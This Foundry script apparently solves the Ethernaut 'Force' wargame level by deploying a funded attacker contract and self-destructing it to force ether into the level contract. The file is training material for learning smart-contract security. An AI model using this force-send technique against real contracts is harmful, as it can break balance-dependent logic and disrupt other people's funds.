// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { ForceAttacker } from "ethernaut/07-force/ForceAttacker.sol";

contract ForceScript is Script {
    event AddressBalance(address account, uint256 balance);

    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address forceAddr = vm.envAddress("L07_FORCE_ADDRESS");

        // Step 1: deploy attacker and fund it with ether
        ForceAttacker forceAttacker = new ForceAttacker{value: 0.000001 ether}();

        // Step 2: destroy attacker and force-send ether to the victim
        forceAttacker.exploit(forceAddr);

        uint256 forceBalance = forceAddr.balance;
        emit AddressBalance(forceAddr, forceBalance);

        vm.stopBroadcast();
    }
}
